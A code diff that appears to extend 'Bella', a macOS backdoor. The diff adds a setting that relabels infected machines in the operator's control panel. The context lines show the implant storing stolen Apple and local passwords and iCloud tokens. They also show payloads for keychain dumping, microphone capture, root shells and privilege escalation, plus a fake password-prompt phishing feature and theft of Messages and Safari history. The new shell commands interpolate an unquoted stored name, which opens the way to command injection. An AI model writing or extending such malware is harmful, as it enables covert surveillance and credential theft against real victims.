@@ -163,7 +163,7 @@ def createDB():
 	try:
 		conn = sqlite3.connect('%sbella.db' % get_bella_path()) #will create if doesnt exist
 		c = conn.cursor()
-		c.execute("CREATE TABLE bella (id int, username text, lastLogin text, model text, mme_token text, applePass text, localPass text, chromeSS text, text)")
+		c.execute("CREATE TABLE bella (id int, username text, lastLogin text, model text, mme_token text, applePass text, localPass text, chromeSS text, client_name text)")
 		c.execute("CREATE TABLE payloads(id int, vnc text, keychaindump text, microphone text, root_shell text, insomnia text, lock_icon text, chainbreaker text, mach_race text)")
 		conn.commit()
 		conn.close()
@@ -882,8 +882,14 @@ def initialize_socket():
 
 	if os.getuid() == 0:
 		basicInfo = 'ROOTED\n'
-	
-	output = check_output('scutil --get LocalHostName; echo %s; pwd; echo %s' % (get_bella_user(), readDB('lastLogin')))
+
+	client_name = readDB('client_name')
+
+	if client_name == False:
+		output = check_output('scutil --get LocalHostName; echo %s; pwd; echo %s' % (get_bella_user(), readDB('lastLogin')))
+	else:
+		output = check_output('echo "%s"; echo "%s"; pwd; echo "%s"' % (client_name, get_bella_user(), readDB('lastLogin')))
+
 	if output[0]:
 		basicInfo += output[1]
 	else:
@@ -978,6 +984,7 @@ def manual():
 	value += "\n%sRemove Server%s\nCompletely removes a Bella server remotely.\nUsage: %sremoveserver_yes%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sSafari History%s\nDownloads user's Safari history in a nice format.\nUsage: %ssafari_history%s\nRequirements: None.\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
 	value += "\n%sScreenshot%s\nTake a screen shot of the current active desktop.\nUsage: %sscreen_shot%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
+	value += "\n%sSet Client Name%s\nChange the computer name that is displayed in the Control Center.\nUsage: %sset_client_name%s\nRequirements: None.\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
 	value += "\n%sShutdown Server%s\nUnloads Bella from launchctl until next reboot.\nUsage: %sshutdown_server%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sSystem Information%s\nReturns basic information about the system.\nUsage: %ssysinfo%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sUser Pass Phish%s\nWill phish the user for their password with a clever dialog.\nUsage: %suser_pass_phish%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
@@ -1601,6 +1608,10 @@ def applepwRead():
 		return pw
 	return decrypt(pw)
 
+def set_client_name(name):
+	updateDB(name, 'client_name')
+	return 'updated_client_name:::%s:::%sUpdated client name to [%s].\n' % (name, blue_star, name)
+
 def screenShot():
 	screen = os.system("screencapture -x /tmp/screen")
 	try:
@@ -1732,7 +1743,7 @@ def bella(*Emma):
 	while True:
 		subprocess_cleanup()
 		print "Starting Bella"
-
+		#rooter(). try to get root automatically. uncomment this line, if you want to run bella on say, a Guest account, and have it automatically escalate to root (via LPE) without you having to do anything.
 		#create encrypted socket.
 		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -1926,6 +1937,10 @@ def bella(*Emma):
 					certsha1 = data.split(":::")[2]
 					mitm_kill(interface, certsha1)
 
+				elif data.startswith("set_client_name"):
+					name = data.split(":::")[1]
+					send_msg(set_client_name(name), True)
+
 				elif data == 'chat_history':
 					chatDb = globber("/Users/*/Library/Messages/chat.db") #just get first chat DB
 					serial = []
@@ -2037,7 +2052,11 @@ def bella(*Emma):
 					#we shouldnt have to kill iTunes, but if there is a problem with launchctl ..
 
 				elif data == 'get_client_info':
-					output = check_output('scutil --get LocalHostName | tr -d "\n"; printf -- "->"; whoami | tr -d "\n"')
+					client_name = readDB('client_name')
+					if client_name == False:
+						output = check_output('scutil --get LocalHostName | tr -d "\n"; printf -- "->"; whoami | tr -d "\n"')
+					else:
+						output = check_output('echo "%s" | tr -d "\n"; printf -- "->"; whoami | tr -d "\n"' % client_name)
 					if not output[0]:
 						send_msg('Error-MB-Pro -> Error', True)
 						continue
